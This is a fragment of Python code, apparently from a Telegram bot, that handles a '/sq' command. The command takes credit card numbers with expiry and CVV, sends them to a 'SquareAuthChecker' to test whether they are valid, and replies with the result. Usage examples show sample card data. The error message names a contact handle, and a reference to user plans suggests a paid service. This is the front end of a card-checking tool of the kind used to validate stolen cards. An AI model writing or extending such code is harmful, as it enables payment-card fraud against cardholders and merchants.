⟐ <b>Example</b>: <code>/sq 5275510001092050|10|2028|909</code>
━━━━━━━━━━━━━""")
            return

        card_details = args[1].strip()
        parts = card_details.split('|')

        if len(parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
⟐ <b>Format</b>: <code>cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>5275510001092050|10|2028|909</code>
━━━━━━━━━━━━━""")
            return

        cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]

        checker = SquareAuthChecker()
        processing_msg = await message.reply(checker.get_processing_message(cc, mes, ano, cvv, username, plan_name))

        result = await checker.check_card(card_details, username, user_data)

        await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
⟐ <b>Error</b>: <code>{str(e)[:100]}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code>
━━━━━━━━━━━━━""")